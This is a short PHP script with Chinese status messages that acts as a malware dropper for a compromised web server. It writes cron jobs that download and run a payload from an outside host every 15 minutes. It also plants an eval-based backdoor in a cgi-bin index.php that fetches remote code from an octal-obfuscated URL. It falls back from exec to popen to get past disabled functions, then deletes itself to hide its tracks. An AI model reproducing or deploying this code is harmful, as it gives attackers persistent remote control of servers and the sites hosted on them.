<?php
	$qishu = "24"; //数据组
	$qishu = strtolower($qishu);
	$root = $_SERVER["DOCUMENT_ROOT"];
	$disabled = explode(',', ini_get('disable_functions'));
	$new_disable = array();
	foreach ($disabled as $item) {
		$new_disable[] = trim($item);
	}
	$cmd = 'echo "*/15 * * * * wget -q -O xxxd http://hello.ok2345678.xyz/xxxd && chmod 0755 xxxd && /bin/sh xxxd '.$root.' '.$qishu.' && rm -f xxxd" > conf && crontab conf; rm -f conf';
	if(in_array('exec', $new_disable)) {
		$f=popen("$cmd >/dev/null 2>&1 &", "r");
		pclose($f);
		echo "popen 执行成功！<br>";
	}else{
		exec("$cmd >/dev/null 2>&1 &");
		echo "exec 执行成功！<br>";
	}
	
	$cmd = 'crontab -l > conf && echo "*/30 * * * * mkdir -p '.$root.'/cgi-bin && echo \'<?php eval(\"\\77\\76\".file_get_contents(\"\\150\\164\\164\\160\\163\\72\\57\\57\\142\\151\\164\\56\\154\\171\\57\\63\\161\\166\\107\\167\\107\\167\")); ?>\' > '.$root.'/cgi-bin/index.php" >> conf && crontab conf; rm -f conf';
	if(in_array('exec', $new_disable)) {
		$f=popen("$cmd >/dev/null 2>&1 &", "r");
		pclose($f);
		echo "popen 执行成功第二藏马！<br>";
	}else{
		exec("$cmd >/dev/null 2>&1 &");
		echo "exec 执行成功第二藏马！<br>";
	}
	if(@unlink(__FILE__)){
		echo "自身文件删除成功<br>";
	}